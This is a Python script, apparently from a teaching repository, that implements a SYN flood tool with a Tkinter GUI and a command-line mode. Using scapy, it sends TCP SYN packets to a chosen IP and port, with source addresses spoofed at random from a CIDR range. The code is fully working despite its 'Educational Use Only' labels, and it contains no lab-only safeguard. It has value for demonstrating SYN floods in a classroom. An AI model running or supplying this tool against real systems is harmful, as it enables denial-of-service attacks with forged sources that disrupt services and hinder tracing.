import sys
import time
import random
import threading
import ipaddress
from scapy.all import *
import tkinter as tk
from tkinter import ttk, messagebox

def resolveSourceIP(source):
    source = source.strip()
    if "/" in source:
        hosts = list(ipaddress.IPv4Network(source, strict=False).hosts())
        return str(random.choice(hosts))
    return source

def guiFunction():
    stopEvent = threading.Event()

    def synFlood(destIP, destPort, packetCount, delay=0.1, outputText=None, srcTemplate="192.168.x.x"):
        if outputText:
            outputText.insert(tk.END, "[+] Starting SYN Flood Simulation (Educational Use Only)\n")
            outputText.insert(tk.END, f"[+] Target: {destIP}:{destPort}\n")
            outputText.insert(tk.END, f"[+] Sending {packetCount} packets with {delay}s delay\n\n")
            outputText.see(tk.END)  
        else:
            print(f"[+] Starting SYN Flood Simulation (Educational Use Only)")
            print(f"[+] Target: {destIP}:{destPort}")
            print(f"[+] Sending {packetCount} packets with {delay}s delay\n")

        for i in range(1, packetCount + 1):
            if stopEvent.is_set():
                msg = "\n[✗] Simulation Stopped by User\n"
                if outputText:
                    outputText.insert(tk.END, msg)
                    outputText.see(tk.END)
                else:
                    print(msg)
                return

            srcIP = resolveSourceIP(srcTemplate)
            packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")

            try:
                send(packet, verbose=0)
                message = f"[→] Packet {i}: {srcIP} → {destIP}:{destPort} (SYN)\n"
                if outputText:
                    outputText.insert(tk.END, message)
                    outputText.see(tk.END)
                else:
                    print(message)
                time.sleep(delay)
            except Exception as e:
                errorMessage = f"[!] Error: {e}\n"
                if outputText:
                    outputText.insert(tk.END, errorMessage)
                    outputText.see(tk.END)
                else:
                    print(errorMessage)
                break

        completionMessage = "\n[✓] Simulation Complete\n"
        if outputText:
            outputText.insert(tk.END, completionMessage)
            outputText.see(tk.END)
        else:
            print(completionMessage)

    def runSimulation():
        destIP = ipEntry.get()
        try:
            destPort = int(portEntry.get())
            packetCount = int(countEntry.get())
            delay = float(delayEntry.get())
        except ValueError:
            messagebox.showerror("Error", "Please enter valid integer values for Port and Packet Count, and a valid float for Delay.")
            return

        if not destIP:
            messagebox.showerror("Error", "Please enter a Destination IP address.")
            return

        srcTemplate = srcEntry.get().strip() or "192.168.x.x"

        stopEvent.clear()
        outputText.delete(1.0, tk.END)
        runButton.config(state=tk.DISABLED)
        stopButton.config(state=tk.NORMAL)

        thread = threading.Thread(target=synFlood, args=(destIP, destPort, packetCount, delay, outputText, srcTemplate), daemon=True)
        thread.start()

        def checkDone():
            if thread.is_alive():
                root.after(200, checkDone)
            else:
                runButton.config(state=tk.NORMAL)
                stopButton.config(state=tk.DISABLED)

        root.after(200, checkDone)

    def stopSimulation():
        stopEvent.set()
        stopButton.config(state=tk.DISABLED)

    def showHelp():
        helpText = """SYN Flood Simulator (Educational Use Only)

GUI Usage:
  1. Enter Destination IP and Port of the target.
  2. Enter Packet Count and Delay between packets.
  3. Enter Source IP (e.g. 192.168.1.5) or a CIDR network
     (e.g. 192.168.0.0/24) for random spoofed sources.
  4. Click 'Start Simulation' to begin, 'Stop' to abort.

CLI Usage:
  sudo python ddos-attack-app.py <destIP> <destPort> <packetCount> [srcIP/Network]
  Example: sudo python ddos-attack-app.py 192.168.8.40 80 30 192.168.0.0/24

WARNING: For controlled educational environments only.
Unauthorized use is illegal and unethical.
Created for learning purposes in teaching classes.
https://github.com/kaledaljebur/ddos
"""
        top = tk.Toplevel(root)
        top.title("Help")
        top.geometry("750x360")
        textFrame = ttk.Frame(top)
        textFrame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        scrollbar = ttk.Scrollbar(textFrame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        helpText_widget = tk.Text(textFrame, wrap=tk.WORD, padx=8, pady=8, yscrollcommand=scrollbar.set)
        helpText_widget.insert(tk.END, helpText)
        helpText_widget.config(state=tk.DISABLED)
        helpText_widget.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=helpText_widget.yview)
        closeButton = ttk.Button(top, text="Close", command=top.destroy)
        closeButton.pack(pady=5)

    print("Please follow the GUI window.")
    root = tk.Tk()
    root.title("SYN Flood Simulator (Educational)")

    mainFrame = ttk.Frame(root, padding="10")
    mainFrame.grid(column=0, row=0, sticky=(tk.W, tk.E, tk.N, tk.S))
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    
    ipLabel = ttk.Label(mainFrame, text="Destination IP:")
    ipLabel.grid(column=0, row=0, sticky=tk.W)
    ipEntry = ttk.Entry(mainFrame)
    ipEntry.grid(column=1, row=0, sticky=(tk.W, tk.E))
    ipEntry.insert(0, "192.168.8.40")  
    
    portLabel = ttk.Label(mainFrame, text="Destination Port:")
    portLabel.grid(column=0, row=1, sticky=tk.W)
    portEntry = ttk.Entry(mainFrame)
    portEntry.grid(column=1, row=1, sticky=(tk.W, tk.E))
    portEntry.insert(0, "80")  
    
    countLabel = ttk.Label(mainFrame, text="Packet Count:")
    countLabel.grid(column=0, row=2, sticky=tk.W)
    countEntry = ttk.Entry(mainFrame)
    countEntry.grid(column=1, row=2, sticky=(tk.W, tk.E))
    countEntry.insert(0, "30")  
    
    delayLabel = ttk.Label(mainFrame, text="Delay (seconds):")
    delayLabel.grid(column=0, row=3, sticky=tk.W)
    delayEntry = ttk.Entry(mainFrame)
    delayEntry.grid(column=1, row=3, sticky=(tk.W, tk.E))
    delayEntry.insert(0, "0.1")

    srcLabel = ttk.Label(mainFrame, text="Source IP / Network:")
    srcLabel.grid(column=0, row=4, sticky=tk.W)
    srcEntry = ttk.Entry(mainFrame)
    srcEntry.grid(column=1, row=4, sticky=(tk.W, tk.E))
    srcEntry.insert(0, "192.168.0.0/24")

    buttonFrame = ttk.Frame(mainFrame)
    buttonFrame.grid(column=0, row=5, columnspan=2, pady=10)
    runButton = ttk.Button(buttonFrame, text="Start Simulation", command=runSimulation)
    runButton.pack(side=tk.LEFT, padx=5)
    stopButton = ttk.Button(buttonFrame, text="Stop", command=stopSimulation, state=tk.DISABLED)
    stopButton.pack(side=tk.LEFT, padx=5)

    helpButton = ttk.Button(mainFrame, text="Help", command=showHelp)
    helpButton.grid(column=0, row=6, columnspan=2, pady=5)

    outputLabel = ttk.Label(mainFrame, text="Output:")
    outputLabel.grid(column=0, row=7, sticky=tk.W)
    outputText = tk.Text(mainFrame, height=10, width=40)
    outputText.grid(column=0, row=8, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S))
    outputScrollbar = ttk.Scrollbar(mainFrame, command=outputText.yview)
    outputScrollbar.grid(column=2, row=8, sticky=(tk.N, tk.S))
    outputText.config(yscrollcommand=outputScrollbar.set)
    
    for child in mainFrame.winfo_children():
        child.grid_configure(padx=5, pady=5)

    root.mainloop()

def arguFunction():
    def synFloodArgu(destIP, destPort, packetCount, srcTemplate="192.168.0.0/24", delay=0.1):
        print(f"[+] Starting SYN Flood Simulation (Educational Use Only)")
        print(f"[+] Target: {destIP}:{destPort}")
        print(f"[+] Source: {srcTemplate}")
        print(f"[+] Sending {packetCount} packets with {delay}s delay\n")

        for i in range(1, packetCount + 1):
            srcIP = resolveSourceIP(srcTemplate)
            packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")

            try:
                send(packet, verbose=0)
                print(f"[→] Packet {i}: {srcIP} → {destIP}:{destPort} (SYN)")
                time.sleep(delay)
            except Exception as e:
                print(f"[!] Error: {e}")
                break

        print("\n[✓] Simulation Complete")

    destIP = sys.argv[1]
    destPort = int(sys.argv[2])
    packetCount = int(sys.argv[3])
    srcTemplate = sys.argv[4] if len(sys.argv) == 5 else "192.168.0.0/24"

    synFloodArgu(destIP, destPort, packetCount, srcTemplate, delay=0.1)

def helpMenu():
    helpText2 = """
    Usage (GUI):      sudo python ddos-attack-app.py
    Usage (CLI):      sudo python ddos-attack-app.py <destIP> <destPort> <packetCount> [srcIP/Network]
    Example (basic):  sudo python ddos-attack-app.py 192.168.8.40 80 30
    Example (source): sudo python ddos-attack-app.py 192.168.8.40 80 30 10.0.0.0/24

    srcIP/Network: a single IP or CIDR range (e.g. 192.168.1.5 or 192.168.0.0/24).
                   Defaults to 192.168.0.0/24 if omitted.

    https://github.com/kaledaljebur/ddos
    """
    print(helpText2)
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        guiFunction()
    elif len(sys.argv) in (4, 5):
        arguFunction()
    else:
        helpMenu()